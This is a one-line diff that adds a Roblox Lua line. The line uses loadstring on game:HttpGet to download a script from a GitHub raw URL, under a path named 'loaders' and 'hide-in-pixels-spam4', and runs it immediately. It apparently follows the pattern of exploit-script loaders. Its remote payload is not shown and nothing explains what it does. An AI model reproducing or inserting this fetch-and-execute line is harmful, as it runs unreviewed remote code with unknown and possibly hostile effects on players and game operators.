@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SmartHammerAnimate/loaders/main/loaders/hide-in-pixels-spam4-hheemi6ml2gcrg.lua"))()
